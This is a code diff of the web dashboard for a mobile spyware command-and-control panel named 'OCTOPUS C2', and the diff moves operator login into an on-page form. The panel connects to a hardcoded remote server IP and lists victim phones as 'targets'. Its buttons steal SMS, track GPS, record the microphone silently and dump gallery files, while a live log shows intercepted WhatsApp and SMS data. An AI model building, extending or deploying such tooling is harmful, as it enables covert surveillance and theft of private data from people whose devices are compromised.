@@ -3,254 +3,180 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OCTOPUS ELITE | V5.0_STABLE</title>
+    <title>OCTOPUS C2 | ELITE TERMINAL</title>
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
             --neon-red: #ff003c;
-            --dark-bg: #030303;
+            --dark-bg: #050505;
+            --card-bg: #0a0a0a;
             --terminal-green: #00ff41;
             --toxic-yellow: #f1c40f;
-            --wa-cyan: #00f2ff;
-            --glass: rgba(255, 255, 255, 0.05);
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; cursor: crosshair; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Fira Code', monospace; }
+        body { background: var(--dark-bg); color: #eee; overflow: hidden; height: 100vh; }
 
-        body {
-            background-color: var(--dark-bg);
-            background-image: radial-gradient(circle, #111 1px, transparent 1px);
-            background-size: 25px 25px;
-            color: #eee;
-            font-family: 'Fira Code', monospace;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow: hidden;
+        /* --- LOGIN SCREEN --- */
+        #login-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; display: flex; align-items: center; justify-content: center; z-index: 9999;
+            background-image: radial-gradient(circle, #111 1px, transparent 1px); background-size: 30px 30px;
         }
 
-        /* --- TOP BAR --- */
+        .login-box {
+            width: 400px; padding: 40px; background: var(--card-bg); border: 1px solid #222;
+            text-align: center; box-shadow: 0 0 50px rgba(255, 0, 60, 0.1);
+        }
+
+        .login-box h2 { color: var(--neon-red); margin-bottom: 20px; letter-spacing: 5px; }
+        .login-box input {
+            width: 100%; padding: 15px; margin-bottom: 15px; background: #000;
+            border: 1px solid #333; color: var(--terminal-green); outline: none;
+        }
+
+        .login-box button {
+            width: 100%; padding: 15px; background: var(--neon-red); border: none;
+            color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase;
+        }
+
+        /* --- DASHBOARD (HIDDEN BY DEFAULT) --- */
+        #dashboard { display: none; flex-direction: column; height: 100vh; }
+
         header {
-            padding: 20px 40px;
-            border-bottom: 2px solid #1a1a1a;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: #000;
+            padding: 20px 40px; border-bottom: 1px solid #222; background: #000;
+            display: flex; justify-content: space-between; align-items: center;
         }
 
-        .glitch {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: #fff;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
+        .wrapper { display: grid; grid-template-columns: 1fr 400px; flex-grow: 1; overflow: hidden; }
 
-        #auth-status { font-size: 10px; color: var(--terminal-green); letter-spacing: 1px; }
-
-        /* --- MAIN LAYOUT --- */
-        .wrapper {
-            display: grid;
-            grid-template-columns: 1fr 400px;
-            flex-grow: 1;
-            overflow: hidden;
-        }
-
-        /* --- TARGET GRID --- */
-        main { padding: 25px; overflow-y: auto; background: rgba(0,0,0,0.5); }
-        
-        #target-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
-            gap: 20px;
-        }
+        /* --- TARGET CARDS --- */
+        main { padding: 30px; overflow-y: auto; }
+        #target-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
 
         .card {
-            background: #0a0a0a;
-            border: 1px solid #222;
-            padding: 20px;
-            position: relative;
-            transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            background: var(--card-bg); border: 1px solid #1a1a1a; padding: 25px;
+            position: relative; transition: 0.3s;
         }
-
-        .card:hover { border-color: var(--neon-red); transform: translateY(-5px); box-shadow: 0 10px 30px rgba(255, 0, 60, 0.1); }
-
-        .card h4 { color: var(--neon-red); margin-bottom: 5px; font-size: 14px; }
+        .card:hover { border-color: var(--neon-red); box-shadow: 0 0 20px rgba(255, 0, 60, 0.1); }
+        .card h4 { color: var(--neon-red); font-size: 16px; margin-bottom: 5px; }
         .card small { color: #555; display: block; margin-bottom: 15px; font-size: 10px; }
 
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
-
-        button {
-            background: #111;
-            border: 1px solid #333;
-            color: #ccc;
-            padding: 8px;
-            font-family: inherit;
-            font-size: 10px;
-            text-transform: uppercase;
-            transition: 0.2s;
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        .card button {
+            background: #111; border: 1px solid #333; color: #fff; padding: 8px;
+            font-size: 10px; cursor: pointer; transition: 0.2s;
         }
+        .card button:hover { background: var(--neon-red); color: #000; font-weight: bold; }
 
-        button:hover { background: var(--neon-red); color: #000; border-color: var(--neon-red); font-weight: bold; }
-        
-        .btn-danger { color: #ff4d4d; border-color: #441111; margin-top: 10px; width: 100%; }
-        .btn-danger:hover { background: #ff4d4d; color: #000; }
+        /* --- TERMINAL --- */
+        .sidebar { background: #000; border-left: 1px solid #222; display: flex; flex-direction: column; }
+        #terminal { padding: 20px; font-size: 11px; color: var(--terminal-green); overflow-y: auto; flex-grow: 1; }
+        .log-line { margin-bottom: 10px; border-bottom: 1px solid #111; padding-bottom: 5px; }
 
-        /* --- TERMINAL SIDEBAR --- */
-        .sidebar {
-            background: #000;
-            border-left: 1px solid #222;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .sidebar-header { padding: 15px; background: #080808; border-bottom: 1px solid #222; font-size: 12px; color: #888; }
-
-        #terminal {
-            padding: 15px;
-            font-size: 11px;
-            color: var(--terminal-green);
-            overflow-y: auto;
-            flex-grow: 1;
-            line-height: 1.6;
-            word-break: break-all;
-        }
-
-        #terminal p { margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 4px; }
-
-        /* --- SCROLLBAR --- */
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: #222; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--neon-red); }
-
-        /* --- MOBILE ADAPT --- */
-        @media (max-width: 1000px) {
-            .wrapper { grid-template-columns: 1fr; }
-            .sidebar { height: 350px; }
-        }
+        .status-dot { width: 10px; height: 10px; background: red; border-radius: 50%; display: inline-block; margin-right: 10px; }
     </style>
 </head>
 <body>
 
-<header>
-    <div>
-        <h1 class="glitch">OCTOPUS_ELITE_C2</h1>
-        <div id="auth-status">INITIALIZING_SECURE_LINK...</div>
+<div id="login-overlay">
+    <div class="login-box">
+        <h2 id="glitch-title">OCTOPUS_C2</h2>
+        <input type="text" id="user" placeholder="OPERATOR_ID">
+        <input type="password" id="pass" placeholder="ACCESS_KEY">
+        <button onclick="attemptLogin()">INITIATE_SESSION</button>
+        <p id="error-msg" style="color: red; font-size: 10px; margin-top: 15px; display: none;">ACCESS_DENIED: INVALID_ID</p>
     </div>
-    <div style="text-align: right">
-        <p id="op-id" style="color: var(--toxic-yellow); font-size: 12px;"></p>
-        <p style="font-size: 8px; color: #444;">ENCRYPTION: AES-256-RSA</p>
-    </div>
-</header>
+</div>
 
-<div class="wrapper">
-    <main>
-        <div id="target-grid">
-            </div>
-    </main>
-
-    <aside class="sidebar">
-        <div class="sidebar-header">LIVE_DATA_INTERCEPTOR</div>
-        <div id="terminal">
-            <p>> Waiting for Mastermind Authentication...</p>
+<div id="dashboard">
+    <header>
+        <div>
+            <h1 style="font-size: 18px; letter-spacing: 2px;">OCTOPUS <span style="color:var(--neon-red)">CORE</span></h1>
+            <p style="font-size: 10px; color: #444;">V5.0_ELITE_STABLE</p>
         </div>
-    </aside>
+        <div>
+            <span id="conn-status" class="status-dot"></span>
+            <span id="active-user" style="color:var(--toxic-yellow); font-size: 12px;"></span>
+        </div>
+    </header>
+
+    <div class="wrapper">
+        <main>
+            <div id="target-grid"></div>
+        </main>
+        <aside class="sidebar">
+            <div style="padding: 15px; background: #080808; border-bottom: 1px solid #222; font-size: 12px;">INTERCEPTOR_LOGS</div>
+            <div id="terminal"></div>
+        </aside>
+    </div>
 </div>
 
 <script>
-    // --- AUTHENTICATION LAYER ---
-    const operator = prompt("OPERATOR_ID:");
-    const accessKey = prompt("ACCESS_KEY:");
-
-    const socket = io("http://51.68.234.157:20211", { 
-        query: { 
-            type: 'mastermind', 
-            user: operator, 
-            key: accessKey 
-        } 
-    });
-
+    let socket;
     const term = document.getElementById('terminal');
-    const authStatus = document.getElementById('auth-status');
-    const opIdDisplay = document.getElementById('op-id');
 
-    socket.on('connect', () => {
-        term.innerHTML += `<p style="color:white;">[LINK] Socket established. Verifying credentials...</p>`;
-    });
+    function attemptLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
 
-    socket.on('auth_success', (data) => {
-        authStatus.innerText = "LINK_STABLE // ACCESS_GRANTED";
-        authStatus.style.color = "var(--terminal-green)";
-        opIdDisplay.innerText = "OP_ACTIVE: " + data.user.toUpperCase();
-        term.innerHTML += `<p style="color:var(--terminal-green)">[SYSTEM] Welcome, Operator ${data.user}. Secure session started.</p>`;
-    });
+        // Correct Socket URL
+        socket = io("http://51.68.234.157:20211", { 
+            query: { type: 'mastermind', user: u, key: p } 
+        });
 
-    socket.on('auth_failed', () => {
-        alert("CRITICAL_ERROR: INVALID_CREDENTIALS. DISCONNECTING.");
-        window.location.reload();
-    });
+        socket.on('auth_success', (data) => {
+            document.getElementById('login-overlay').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'flex';
+            document.getElementById('active-user').innerText = "OP: " + data.user.toUpperCase();
+            document.getElementById('conn-status').style.background = 'var(--terminal-green)';
+            addLog("SYSTEM", "Authentication Successful. Node link active.");
+        });
 
-    // --- TARGET HANDLERS ---
-    socket.on('load_targets', (targets) => {
-        Object.keys(targets).forEach(id => addTargetCard(id, targets[id]));
-    });
+        socket.on('auth_failed', () => {
+            document.getElementById('error-msg').style.display = 'block';
+            socket.disconnect();
+        });
 
-    socket.on('update_dashboard', (res) => {
-        addTargetCard(res.id, res.data);
-    });
+        socket.on('load_targets', (targets) => {
+            Object.keys(targets).forEach(id => addTarget(id, targets[id]));
+        });
 
-    socket.on('target_offline', (id) => {
-        const card = document.getElementById(id);
-        if(card) card.style.opacity = "0.3";
-        term.innerHTML += `<p style="color:red;">[LOST] Target ${id} went offline.</p>`;
-    });
+        socket.on('update_dashboard', (res) => addTarget(res.id, res.data));
 
-    // --- DATA STREAMING ---
-    socket.on('display_extra', (res) => {
-        const time = new Date().toLocaleTimeString();
-        let color = "var(--terminal-green)";
-        let tag = res.payload.type.toUpperCase();
+        socket.on('display_extra', (res) => {
+            addLog(res.payload.type, JSON.stringify(res.payload.data));
+        });
+    }
 
-        if(tag === 'WA_LOG') color = "var(--wa-cyan)";
-        if(tag === 'SMS_LOG') color = "magenta";
-        if(tag === 'ERROR') color = "red";
-
-        const logEntry = `
-            <p style="color:${color}">
-                [${time}] [${tag}] TargetID: ${res.id.substring(0,6)}...<br>
-                DATA: ${JSON.stringify(res.payload.data)}
-            </p>
-        `;
-        term.insertAdjacentHTML('afterbegin', logEntry);
-    });
-
-    function addTargetCard(id, data) {
+    function addTarget(id, data) {
         if(document.getElementById(id)) return;
-        
         const grid = document.getElementById('target-grid');
         const card = document.createElement('div');
-        card.id = id;
-        card.className = 'card';
+        card.id = id; card.className = 'card';
         card.innerHTML = `
-            <h4>NODE: ${data.model}</h4>
-            <small>UID: ${id}</small>
+            <h4>${data.model}</h4>
+            <small>NODE_ID: ${id.substring(0,8)}</small>
             <div class="btn-grid">
-                <button onclick="sendCmd('${id}','sms')">Fetch SMS</button>
-                <button onclick="sendCmd('${id}','gps')">Locate GPS</button>
-                <button onclick="sendCmd('${id}','mic')">Silent Rec</button>
-                <button onclick="sendCmd('${id}','gallery')">Dump Files</button>
+                <button onclick="sendCmd('${id}','sms')">SMS</button>
+                <button onclick="sendCmd('${id}','gps')">GPS</button>
+                <button onclick="sendCmd('${id}','mic')">MIC</button>
+                <button onclick="sendCmd('${id}','gallery')">FILES</button>
             </div>
-            <button class="btn-danger" onclick="sendCmd('${id}','off')">KILL_PROCESS</button>
+            <button onclick="sendCmd('${id}','off')" style="width:100%; margin-top:10px; border-color:#441111; color:red;">KILL</button>
         `;
         grid.appendChild(card);
     }
 
-    function sendCmd(targetId, action) {
-        term.innerHTML = `<p style="color:var(--toxic-yellow)">[CMD] Requesting ${action} on ${targetId}...</p>` + term.innerHTML;
-        socket.emit('run_action', { targetId: targetId, action: action });
+    function sendCmd(tid, act) {
+        addLog("CMD", `Sending ${act} to node ${tid.substring(0,5)}...`);
+        socket.emit('run_action', { targetId: tid, action: act });
+    }
+
+    function addLog(type, msg) {
+        const line = `<div class="log-line"><span style="color:var(--toxic-yellow)">[${type}]</span> ${msg}</div>`;
+        term.insertAdjacentHTML('afterbegin', line);
     }
 </script>
 
